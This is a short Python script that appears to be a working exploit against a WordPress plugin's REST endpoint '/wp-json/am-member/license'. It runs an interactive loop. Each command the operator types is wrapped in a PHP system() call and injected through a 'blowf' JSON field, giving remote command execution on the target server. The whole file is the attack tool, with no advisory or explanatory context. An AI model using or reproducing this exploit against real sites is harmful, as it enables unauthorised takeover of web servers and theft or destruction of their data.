import requests
import sys

url = ("%s/wp-json/am-member/license" % (sys.argv[1]))

while url:
    try:
        command = input("[!] Enter command => ")
        postdata = {"blowfish": 1, "blowf": "system('%s');" % (command)}
        r = requests.post(url, json = postdata)
        print(r.text)
    except requests.exceptions.InvalidSchema:
        sys.exit("[-] Invalid url")
    except KeyboardInterrupt:
        sys.exit("[*] Closing.....")